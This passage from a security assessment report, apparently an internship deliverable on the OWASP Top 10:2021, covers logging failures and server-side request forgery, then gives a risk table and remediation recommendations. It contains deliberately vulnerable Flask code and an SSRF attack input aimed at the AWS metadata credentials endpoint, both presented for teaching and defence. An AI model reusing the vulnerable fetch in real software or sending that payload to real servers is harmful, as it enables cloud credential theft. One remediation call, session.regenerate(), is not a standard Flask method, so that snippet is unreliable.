# Vulnerable — no structured logging of security events, no alerting
@app.route("/login", methods=["POST"])
def login():
    user = authenticate(request.form["username"], request.form["password"])
    if user:
        session["user_id"] = user.id
        return redirect("/dashboard")
    return "Invalid credentials", 401   # failure is silent — nothing logged
```

**Remediation & Secure Coding Practice**
```python
# Remediated — structured, centralized security event logging
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    src_ip = request.remote_addr
    user = authenticate(username, request.form["password"])

    if user:
        security_log.info("auth.success", user=username, src_ip=src_ip)
        session.clear(); session.regenerate()
        session["user_id"] = user.id
        return redirect("/dashboard")

    security_log.warning("auth.failure", user=username, src_ip=src_ip)
    # Forwarded to a centralized SIEM (e.g., Splunk, ELK, Sentinel)
    # with an alerting rule on failure-rate anomalies per user/IP
    return "Invalid credentials", 401
```
- Log all security-relevant events with sufficient context (who, what, when, from where, outcome) — authentication events, authorization failures, input validation failures, and administrative actions at minimum.
- Ship logs to a **centralized, write-once (immutable) log aggregation system** (SIEM) separate from the application host, so an attacker who compromises the host cannot erase the evidence trail.
- Build and tune **alerting rules** for known attack patterns (authentication failure spikes, privilege escalation, mass data export) rather than only collecting logs passively for after-the-fact forensic review.
- Never log sensitive data in plaintext (passwords, full tokens, full card numbers) — mask or omit these fields at the point of log generation.
- Establish and rehearse an **incident response plan**, including defined escalation paths, so that when monitoring does raise an alert, the organization can act on it quickly rather than discovering the alert unread weeks later.

**CWE Mapping:** CWE-778 (Insufficient Logging), CWE-117 (Improper Output Neutralization for Logs)

| Attribute | Rating |
|---|---|
| Typical CVSS | Generally rated as a contributing/amplifying factor rather than a standalone exploit (context-dependent, often 3.0–5.0) |
| Exploitability | Not directly exploitable — enables extended dwell time for other exploited vulnerabilities |
| Prevalence | Common, particularly in organizations without a dedicated security operations function |

### A10:2021 — Server-Side Request Forgery (SSRF)

**Technical Definition**
SSRF occurs when an application fetches a remote resource (an image, a webhook callback, a document preview) using a URL that is influenced, directly or indirectly, by user input — without validating that the resulting request is actually going somewhere the application intends to trust. This allows an attacker to coerce the server itself into making requests to internal-only endpoints, cloud metadata services, or other systems that are not reachable from the public internet but *are* reachable from the server's own network position.

**Root Cause & Impact**
Root cause is treating a user-supplied URL as trustworthy simply because the *request* originates from the trusted application server, without validating the *destination* against an allow-list or blocking access to internal/private IP ranges. Impact includes disclosure of internal network topology, access to internal-only administrative services with no separate authentication, and — most severely in cloud environments — theft of temporary cloud credentials from the instance metadata service (e.g., AWS `169.254.169.254`), which frequently grants the attacker broad access to the victim's entire cloud account.

**Real-World Attack Scenario**
1. Attacker locates a feature that fetches a remote URL on the server's behalf — for example, an "import avatar from URL" feature or a webhook/URL-preview generator.
2. Instead of a legitimate image URL, the attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, the AWS EC2 instance metadata endpoint, which is reachable only from within the instance's own network but is exactly where the vulnerable server is making its request from.
3. The server, trusting the URL as a normal external fetch, makes the request and returns the response content (temporary IAM credentials) back to the attacker, either directly in the rendered output or via an observable timing/error-based side channel.
4. Attacker uses the stolen temporary AWS credentials with the AWS CLI/SDK to enumerate and access other cloud resources the compromised instance's IAM role has permission to reach — S3 buckets, other EC2 instances, databases — potentially achieving full cloud account compromise from a single unvalidated URL field.
5. In a variant of this attack, the attacker instead targets an internal admin panel at `http://10.0.0.5:8080/admin` that has no authentication because it was assumed to be unreachable from outside the private network — the SSRF-vulnerable server becomes an unwitting proxy that bypasses this network-level assumption entirely.

**Vulnerable Code Example**
```python
# Vulnerable — fetches any URL supplied by the user with no destination validation
@app.route("/import-avatar", methods=["POST"])
def import_avatar():
    url = request.form["image_url"]
    response = requests.get(url)          # server-side fetch of attacker-controlled URL
    save_avatar(response.content)
    return "Avatar imported", 200
```

**Remediation & Secure Coding Practice**
```python
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"https"}
BLOCKED_NETWORKS = [
    ipaddress.ip_network("169.254.0.0/16"),   # link-local / cloud metadata
    ipaddress.ip_network("10.0.0.0/8"),       # private ranges
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    resolved_ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    return not any(resolved_ip in net for net in BLOCKED_NETWORKS)

@app.route("/import-avatar", methods=["POST"])
def import_avatar():
    url = request.form["image_url"]
    if not is_safe_url(url):
        abort(400, "URL destination is not permitted")
    response = requests.get(url, timeout=5, allow_redirects=False)  # no redirect-based bypass
    save_avatar(response.content)
    return "Avatar imported", 200
```
- Validate the **resolved destination IP**, not just the URL string, against a strict deny-list of private/link-local/loopback ranges and the cloud metadata address — validating the string alone is bypassable via DNS rebinding and redirects.
- Prefer an **allow-list** of specifically permitted destination domains for any feature that must fetch external resources, rather than attempting to deny-list all bad destinations.
- Disable HTTP redirect-following on server-side fetch requests, or re-validate the destination after every redirect hop, since an initially-safe URL can redirect to an internal address.
- At the infrastructure/network layer, block cloud metadata endpoint access from application workloads that don't explicitly require it, and require the newer, more SSRF-resistant metadata service versions (e.g., AWS IMDSv2, which requires a session token obtainable only via a non-forwardable PUT request).
- Run server-side fetch operations from a network-segmented, egress-restricted proxy or sandboxed environment with no route to internal services, rather than directly from the main application host.

**CWE Mapping:** CWE-918 (Server-Side Request Forgery)

| Attribute | Rating |
|---|---|
| Typical CVSS | 7.5–9.8 (High–Critical), especially in cloud environments where metadata credential theft is possible |
| Exploitability | Low-to-medium complexity; well-documented technique against common cloud metadata endpoints |
| Prevalence | Increasing with cloud adoption; newly promoted into the Top 10 in the 2021 revision |

---

## Risk Summary Table

| # | Category | Typical CVSS Range | Primary Impact |
|---|---|---|---|
| A01 | Broken Access Control | 6.5–8.1 | Unauthorized data access / privilege escalation |
| A02 | Cryptographic Failures | 7.5–9.1 | Credential/PII exposure, offline cracking |
| A03 | Injection (incl. XSS) | 5.0–9.8 | Data breach, auth bypass, session hijack |
| A04 | Insecure Design | 4.0–9.0 | Business-logic abuse, financial loss |
| A05 | Security Misconfiguration | 5.3–9.8 | Info disclosure, RCE via debug interfaces |
| A06 | Vulnerable & Outdated Components | up to 10.0 | Inherited RCE from known CVEs |
| A07 | Identification & Authentication Failures | 7.5–9.8 | Account takeover |
| A08 | Software & Data Integrity Failures | 8.1–9.8 | RCE via deserialization, supply-chain compromise |
| A09 | Security Logging & Monitoring Failures | 3.0–5.0 | Extended attacker dwell time, hindered response |
| A10 | Server-Side Request Forgery | 7.5–9.8 | Internal network/cloud credential exposure |

---

## Cross-Cutting Recommendations

The ten categories above share common root-cause patterns, and addressing them at the process level is more durable than patching individual findings one at a time.

### 1. Shift Security Left in the SDLC
- Integrate **threat modeling** into design reviews for any feature touching authentication, authorization, payments, or PII — before implementation begins (directly addresses A04).
- Provide developers with **secure-by-default libraries and internal frameworks** for common risk areas (auth, session management, DB access, HTTP clients) so individual engineers are not re-solving cryptography or access-control problems from scratch.

### 2. Automate Security Testing in CI/CD
- **SAST (Static Application Security Testing):** scan source code on every pull request for injection patterns, hardcoded secrets, and insecure API usage (addresses A02, A03, A08).
- **DAST (Dynamic Application Security Testing):** run automated scans against staging environments to catch runtime misconfigurations and missing headers (addresses A05).
- **SCA (Software Composition Analysis):** scan dependency manifests on every build, gating merges on High/Critical CVEs in third-party components, and generate an SBOM per release (addresses A06, A08).
- Treat all three as **build-breaking gates**, not advisory reports that get ignored — a scan result nobody reads provides no risk reduction.

### 3. Enforce Security Headers and Transport Hardening Fleet-Wide
- Standardize `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, and `Referrer-Policy` at the load balancer/API gateway layer so every service inherits them by default rather than depending on each team to configure them correctly (addresses A03, A05).
- Enforce TLS 1.2+ everywhere, with automatic redirect from HTTP to HTTPS and HSTS preload where appropriate (addresses A02).

### 4. Centralize Identity, Access, and Secrets Management
- Route all authentication through a centralized identity provider supporting MFA, rather than allowing individual services to implement bespoke login logic (addresses A07).
- Store all credentials, API keys, and encryption keys in a dedicated secrets manager with audit logging and automated rotation — never in source control or environment files committed to a repository (addresses A02, A05).

### 5. Establish Continuous Patch Management
- Maintain an inventory of all runtime components (OS packages, language runtimes, frameworks, container base images) with automated notification of newly disclosed CVEs affecting anything in the inventory.
- Define severity-based patch SLAs (e.g., Critical: 48–72 hours, High: 7 days, Medium: 30 days) and track compliance against them as an operational metric, not just a one-time audit item (addresses A06).

### 6. Build Real Detection and Response Capability
- Centralize logs from all services into a SIEM with defined alerting rules for authentication anomalies, authorization failures, and abnormal data-access volume.
- Rehearse incident response with tabletop exercises so that when an alert fires, the response is fast and well-rehearsed rather than improvised (addresses A09).

### 7. Make This a Recurring Program, Not a Point-in-Time Audit
The OWASP Top 10 is revised roughly every 3–4 years based on new aggregated data, and an application's own risk profile shifts continuously as new features ship. A single assessment — including this one — establishes a baseline; it does not establish permanent assurance. Recommend a recurring cadence of automated scanning (continuous), internal review (quarterly), and third-party penetration testing (at minimum annually, or after any major architectural change).

---

## Conclusion & Internship Deliverable Sign-off

This report has documented all ten categories of the OWASP Top 10:2021 framework, providing for each: the technical mechanism of the flaw, its root cause and business impact, a realistic attacker workflow, vulnerable and remediated code examples, and standardized CWE risk mapping. Together with the cross-cutting recommendations above, this material is intended to serve both as a **reference document** for engineering teams building or reviewing web applications, and as a **training artifact** demonstrating internship-cycle competency across the full breadth of the OWASP Top 10 risk categories.

The core takeaway across all ten categories is consistent: the majority of high-impact web application vulnerabilities trace back to a small set of recurring root causes — missing server-side validation, misplaced trust in client-supplied data, and inadequate visibility into what the application is actually doing at runtime. Addressing these at the process level (secure design review, automated testing gates, centralized identity and secrets management, and real monitoring) is more durable than remediating individual findings in isolation, and is the recommended direction for continued security maturity beyond this assessment.

**Deliverable status:** Complete
**Prepared as:** Internship Assessment Report — OWASP Top 10:2021 Technical Deep-Dive
**Next recommended step:** Socialize the Cross-Cutting Recommendations section with engineering leadership and prioritize the SDLC automation items (Section: *Automate Security Testing in CI/CD*) for the next planning cycle.
